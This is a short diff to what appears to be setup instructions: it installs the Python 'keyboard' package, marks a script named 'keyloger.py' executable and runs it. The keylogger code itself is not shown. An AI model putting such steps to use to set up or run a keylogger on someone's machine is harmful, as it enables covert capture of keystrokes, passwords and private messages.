@@ -1,3 +1,5 @@
 pip install keyboard
 
-chmod +x 
+chmod +x keyloger.py
+
+python3 keyloger.py
